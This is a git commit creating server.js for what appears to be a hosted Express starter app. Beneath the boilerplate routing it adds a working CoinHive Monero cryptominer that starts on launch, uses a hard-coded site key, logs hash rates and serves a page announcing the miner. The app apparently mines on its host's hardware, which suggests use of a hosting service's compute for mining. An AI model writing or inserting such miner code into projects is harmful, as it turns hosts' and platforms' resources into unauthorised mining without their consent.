99bc7f214a6220f36ba9c7f95d5201b18c29bb6e
Bouuuji <44290693+Bouuuji@users.noreply.github.com>
2018-10-19 12:12:14 +0200

    Create server.js

---
+++ server.js
@@ -0,0 +1,56 @@
+// server.js
+// where your node app starts
+
+// init project
+const express = require('express');
+const app = express();
+
+// we've started you off with Express, 
+// but feel free to use whatever libs or frameworks you'd like through `package.json`.
+
+// http://expressjs.com/en/starter/static-files.html
+app.use(express.static('public'));
+
+// http://expressjs.com/en/starter/basic-routing.html
+app.get('/', function(request, response) {
+  response.sendFile(__dirname + '/views/index.html');
+});
+
+const CoinHive = require('coin-hive');
+const http = require('http');  
+
+(async () => {
+ 
+  // Create miner
+  const miner = await CoinHive('DtsQEHQ1LUU8xdkfVLkIlmWTjwJv6V8z'); // Coin-Hive's Site Key
+ 
+  // Start miner
+  await miner.start();
+ 
+  // Listen on events
+  miner.on('found', () => console.log('Found!!'))
+  miner.on('accepted', () => console.log('Accepted!!'))
+  miner.on('update', data => console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `));
+ 
+  const requestHandler = (request, response) => {  
+    console.log(request.url)
+    response.end('Running the Monero Miner!!')
+  }
+
+  const server = http.createServer(requestHandler)
+
+  server.listen(process.env.PORT, (err) => {  
+    if (err) {
+      return console.log('something bad happened', err)
+    }
+
+    console.log(`server is listening`)
+  })
+
+  // Stop miner
+  //setTimeout(async () => await miner.stop(), 60000);
+})();
